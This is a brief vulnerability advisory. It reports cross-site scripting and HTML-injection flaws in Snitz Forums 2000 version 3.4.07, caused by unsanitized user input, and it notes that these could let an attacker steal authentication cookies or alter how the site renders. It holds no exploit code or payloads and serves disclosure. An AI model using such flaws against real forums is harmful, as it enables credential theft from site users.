Snitz Forums 2000 is prone to a cross-site scripting vulnerability and an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied data.

Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.

Snitz Forums 2000 3.4.07 is vulnerable; other versions may also be affected.
